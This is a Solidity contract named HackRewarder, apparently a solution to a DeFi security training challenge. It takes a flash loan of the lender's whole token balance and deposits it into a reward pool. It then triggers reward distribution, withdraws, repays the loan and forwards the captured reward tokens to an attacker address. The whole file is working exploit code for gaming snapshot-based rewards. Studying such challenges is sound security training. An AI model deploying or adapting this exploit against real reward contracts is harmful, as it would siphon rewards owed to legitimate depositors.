// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;

    function distributeRewards() external returns (uint256);

    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract HackRewarder {
    ITheRewarderPool immutable rewarder;
    IERC20 immutable DVT;
    address immutable attacker;
    IERC20 immutable rewardToken;

    constructor(
        address _rewarder,
        address _DVT,
        address _attacker,
        address _rewardToken
    ) {
        rewarder = ITheRewarderPool(_rewarder);
        DVT = IERC20(_DVT);
        attacker = _attacker;
        rewardToken = IERC20(_rewardToken);
    }

    function attack(address _flashLoanLender) external {
        IFlashLoanerPool(_flashLoanLender).flashLoan(
            DVT.balanceOf(_flashLoanLender)
        );
    }

    function receiveFlashLoan(uint256 _amount) external {
        DVT.approve(address(rewarder), type(uint256).max);
        rewarder.deposit(_amount);
        rewarder.distributeRewards();
        rewarder.withdraw(_amount);
        DVT.transfer(msg.sender, _amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}
